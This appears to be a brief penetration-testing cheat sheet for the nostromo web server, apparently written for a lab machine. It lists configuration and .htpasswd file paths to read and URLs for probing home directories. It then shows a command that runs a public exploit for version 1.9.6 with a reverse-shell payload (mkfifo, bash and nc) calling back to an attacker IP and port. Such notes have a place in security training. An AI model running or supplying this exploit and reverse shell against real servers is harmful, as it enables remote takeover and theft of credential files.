# nostromo

## Intesting Paths

```bash
# log file
/var/nostromo/conf/nhttpd.conf

# read HOMEDIRs
# Try accessing http://IP/~username and http://IP/username/*homedirs_public*

# config file
/var/nostromo/conf/*
/var/nostromo/conf/.htpasswd
```

## v1.9.6

```
https://www.exploit-db.com/exploits/47837
$ python ex.py 10.10.10.165 80 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.161 6969 >/tmp/f"
```
